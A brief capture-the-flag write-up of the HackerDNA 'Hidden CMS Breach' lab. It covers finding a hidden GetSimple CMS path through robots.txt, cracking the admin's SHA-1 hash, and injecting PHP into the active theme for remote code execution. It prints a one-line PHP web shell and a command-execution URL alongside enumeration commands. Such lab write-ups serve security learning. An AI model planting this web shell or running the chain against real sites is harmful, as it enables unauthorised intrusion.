![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-brightgreen?style=flat)
![Tool](https://img.shields.io/badge/Tool-WebEnum-red)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Platform](https://img.shields.io/badge/Platform-HackerDNA-blue)
![Skill](https://img.shields.io/badge/Skill-CMS_Exploitation-success)


# Hidden CMS Breach – GetSimple CMS Enumeration & RCE
**Platform:** HackerDNA  
**Difficulty:** Medium  
**Points:** 20  

A concise walkthrough of the Hidden CMS Breach lab from HackerDNA, focusing on discovering a concealed CMS instance, enumerating its structure, recovering credentials, and leveraging a template‑based injection point to achieve remote code execution and capture both flags.

## Objective
Identify the hidden CMS directory, enumerate its contents, recover and crack the admin password, gain access to the CMS backend, inject PHP into the active theme, obtain RCE, and retrieve the user and root flags.

## Vulnerability Summary
Located a hidden CMS path via robots.txt
Identified the platform as GetSimple CMS
Extracted the admin XML file containing a SHA‑1 password hash
Cracked the hash and logged into the admin panel
Modified the active theme template to execute arbitrary PHP
Achieved command execution through a cmd GET parameter
Enumerated the filesystem and accessed both flags

## Key Commands
curl -I <TARGET_IP>

gobuster dir -u http://<TARGET_IP>/ -w <WORDLIST>

curl http://<TARGET_IP>/robots.txt

nmap -sC -p 80 <TARGET_IP>


## Template injection (sanitized example):
<?php echo shell_exec($_GET['cmd']); ?>

## RCE usage:
http://<TARGET_IP>/new_website/index.php?cmd=ls -la

## Flags
User Flag: `e*******-****-**********3`

Root Flag: `r*******- - -****-**********9 `

## Takeaways
Hidden development paths often leak through robots.txt
Flat‑file CMS platforms may expose sensitive configuration files
SHA‑1 password hashes remain trivial to crack
CMS theme editors are high‑value targets for code execution
Enumeration and controlled exploitation lead directly to both flags
